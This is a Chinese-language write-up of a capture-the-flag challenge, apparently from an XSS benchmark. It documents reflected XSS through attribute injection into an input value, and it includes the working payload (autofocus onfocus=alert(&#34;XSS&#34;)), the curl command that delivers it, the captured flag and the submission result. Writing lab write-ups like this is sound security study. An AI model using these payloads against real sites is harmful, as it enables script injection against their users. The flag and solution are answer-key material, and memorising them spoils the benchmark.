# xben-049-24 · 探索记录

对应题解：[`xben-049-24.md`](./xben-049-24.md)

## 目标与起点

`Werkzeug/1.0.1 Python/2.7.18`，`GET /page?name=…`，样式 `xss15.css`。
反射位置：

```html
<input type=text name=name placeholder="Enter your name..." value="abc">
```

## 第一阶段：逐字符探测（value 上下文）

| 字符 | 结果 |
| --- | --- |
| `"` | 会闭合属性（`Q"Q` 解析成 `value="Q"` + 剩余 `Q"`) |
| 其它可打印字符 | 原样保留（`<` `>` `(` `)` `'` `&` `#` 都在） |

## 第二阶段：属性注入 + 单引号点击

```bash
name=" autofocus onfocus=alert('XSS') x="
```

渲染：

```html
<input … value="" autofocus onfocus=alert() x="">
```

错误信息：`You did an alert with undefined instead of "XSS"`。

**判据**：属性注入成功、`alert` 被调用，但 `'XSS'` 被删（参数变成 undefined）。

## 第三阶段：试各种引号形式

| payload 内的参数写法 | 结果 |
| --- | --- |
| `alert('XSS')` | 被删成 `alert()` |
| `alert("XSS")` | 属性被截断 |
| `alert(&#34;XSS&#34;)` | **Congratulations** |
| `alert(&quot;XSS&quot;)` | **Congratulations** |
| `alert(&#x22;XSS&#x22;)` | **Congratulations** |

## 第四阶段：拿 flag

```bash
curl --get --data-urlencode 'name=" autofocus onfocus=alert(&#34;XSS&#34;) x="' http://$T/page
```

```text
flag{7d276ebf-5879-4c1f-937f-c8204d0131d4}
```

提交：`correct: true, awarded: 200`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| 造标签（`<svg>`/`<img>`） | 输入被丢或无效 | 本关反射在 `value` 里，不需要标签 |
| `alert('XSS')` 单引号 | 参数被删成 undefined | 错误信息明确说 `alert with undefined` |
| `alert("XSS")` 双引号 | 属性被截断 | `value="…"` 未转义 |
| 实体 `&#34;`/`&quot;`/`&#x22;` | **成功** | 属性值里实体在分词后被解码 |

## 这次真正的收获

1. **失败信息能定位到具体环节。** `alert with undefined` 说明触发链路是通的，
   问题只在参数引号——这比盲试 payload 省很多轮。
2. **引号被剥时用 HTML 实体。** `&#34;` 在属性值里解码为 `"`，
   而且不会提前终止属性（解码在分词之后）。
3. **属性注入要点：闭合 → 空格 → 新属性 → 吃掉模板闭合引号。**
   payload 尾部 `x="` 是必要的收尾。
4. **`autofocus` 不可省。** 无头浏览器不会主动聚焦元素，`onfocus` 需要它。
5. **同族差异：** 048（img src）禁 `<` `>` `(` `)`，049（input value）只处理引号；
   每关的过滤点和上下文都不一样。
